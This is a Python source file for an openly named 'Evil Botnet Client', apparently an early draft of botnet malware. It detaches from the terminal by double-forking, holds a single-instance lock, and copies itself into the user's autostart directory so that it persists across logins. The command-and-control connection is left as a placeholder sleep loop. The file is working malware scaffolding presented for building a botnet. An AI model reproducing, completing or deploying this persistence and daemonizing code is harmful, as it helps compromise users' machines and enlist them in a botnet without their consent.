#!/usr/bin/python3

import os
import sys
import shutil
import socket
import time

class client:
    def __init__(self):
        # deamonize the process
        self.daemonize()

        # acquire process lock so only one instance of the daemon can exist at a time
        self.get_lock()

        # copy the file content
        self.copy_client()

        # main loop, this is where client connects to the C&C server. I am not sure excatly how this is to be done using scapy so using a dummy infinite loop for testing instead
        while True:
            time.sleep(10)



    def daemonize(self):
        # fork a child process
        try:
            pid = os.fork()
            if pid > 0:
                # exit first parent
                sys.exit(0)
        except Exception as error:
            print("fork failed, error: {}".format(str(error)), file=sys.stderr)
            sys.exit(1)

        # change working dir
        os.chdir("/")
        # change session id
        os.setsid()
        # set new file permission
        os.umask(0)

        # fork again so child does not regain terminal
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(1)
        except Exception as error:
            print("fork failed, error: {}".format(str(error)), file=sys.stderr)


    def get_lock(self):
        # Without holding a reference to our socket somewhere it gets garbage
        # collected when the function exits
        self._lock_socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        pid = os.getpid()
        process_name = "Evil Botnet Client"
        try:
            # The null byte (\0) means the the socket is created
            # in the abstract namespace instead of being created
            # on the file system itself.
            # Works only in Linux
            self._lock_socket.bind('\0' + process_name)
            print('Process lock acquired, pid is {}'.format(pid))
        except socket.error:
            print('Process already exists', file=sys.stderr)
            sys.exit()

    def copy_client(self):
        auto_config_dir = os.path.join(os.getenv("HOME"), ".config", "autostart")
        auto_config_file = os.path.join(auto_config_dir, "client.py")
        try:
            if not os.path.exists(auto_config_dir):
                os.mkdir(auto_config_dir)
            shutil.copyfile(__file__, auto_config_file)
        except Exception as e:
            print("failed to copy client, error: {}".format(str(e)), file=sys.stderr)

if  __name__ ==  '__main__':
    client()